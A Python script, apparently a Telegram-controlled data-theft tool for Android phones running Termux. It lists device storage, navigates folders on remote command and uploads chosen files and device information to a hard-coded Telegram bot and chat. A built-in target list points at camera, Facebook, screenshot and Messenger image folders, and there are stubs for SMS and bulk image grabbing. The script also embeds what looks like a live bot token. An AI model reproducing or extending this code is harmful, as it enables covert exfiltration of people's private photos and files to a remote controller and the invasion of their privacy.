import os
import requests
import subprocess

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Global variables
current_folder = "/storage/emulated/0/"
directories_to_search = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/DCIM/Facebook",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/Pictures/Messenger"
]

# Function to escape special characters for Telegram Markdown
def escape_markdown(text):
    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in escape_chars:
        text = text.replace(char, f'\\{char}')
    return text

# Function to send message or document to Telegram
def send_to_telegram(message, document=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": escape_markdown(message),  # Escape special characters
        "parse_mode": "MarkdownV2"  # Use MarkdownV2 for better support
    }
    
    try:
        if document:
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': open(document, 'rb')}
            response = requests.post(url, files=files, data={"chat_id": CHAT_ID})
        else:
            response = requests.post(url, data=data)
        
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to get storage file and folder list
def get_storage_list(folder_path):
    try:
        file_list = os.listdir(folder_path)
        if file_list:
            return file_list
        else:
            return "No files or folders found."
    except Exception as e:
        return f"Error getting file list: {str(e)}"

# Function to download a specific file
def download_file(file_name):
    try:
        file_path = os.path.join(current_folder, file_name)
        
        if os.path.isfile(file_path):
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': open(file_path, 'rb')}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                return f"File `{file_name}` sent successfully!"
            else:
                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
        else:
            return f"File `{file_name}` does not exist or is not a valid file."
    except Exception as e:
        return f"Error downloading file: {str(e)}"

# Function to handle folder navigation
def handle_folder_navigation(folder_name):
    global current_folder
    try:
        # Use absolute path to handle folder navigation properly
        new_folder_path = os.path.abspath(os.path.join(current_folder, folder_name))
        
        if os.path.isdir(new_folder_path):
            current_folder = new_folder_path
            file_list = get_storage_list(current_folder)
            if isinstance(file_list, list):
                file_list_message = f"*Contents of `{current_folder}`:*\n"
                file_list_message += "\n".join([f"`{file}`" for file in file_list])
                file_list_message += "\n\nSend the file name to download it, or folder name to navigate."
                send_to_telegram(file_list_message)
            else:
                send_to_telegram(file_list)
        else:
            send_to_telegram(f"`{folder_name}` is not a valid folder.")
    except Exception as e:
        send_to_telegram(f"Error navigating folder: {str(e)}")

# Function to get device information
def get_device_info():
    try:
        device_info = {
            "Device Name": subprocess.run(['termux-info'], capture_output=True, text=True).stdout,
            "Battery Level": subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout
        }
        device_info_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
        return device_info_str
    except Exception as e:
        return f"Error retrieving device info: {str(e)}"

# Function to handle Telegram bot commands
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            if message.startswith('/'):
                if message == '/sms':
                    send_to_telegram("This command is under construction.")  # Handle SMS logic here
                elif message == '/device':
                    send_to_telegram(get_device_info())
                elif message == '/sdcard':
                    handle_folder_navigation("storage/emulated/0")
                elif message == '/download_images':
                    send_to_telegram("This command is under construction.")  # Handle image logic here
                else:
                    send_to_telegram(f"Unknown command `{message}`.")
            else:
                folder_path = os.path.join(current_folder, message)
                if os.path.isdir(folder_path):
                    handle_folder_navigation(message)
                else:
                    response_message = download_file(message)
                    send_to_telegram(response_message)
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Function to listen for Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    send_to_telegram("Bot is starting...")
    listen_for_updates()
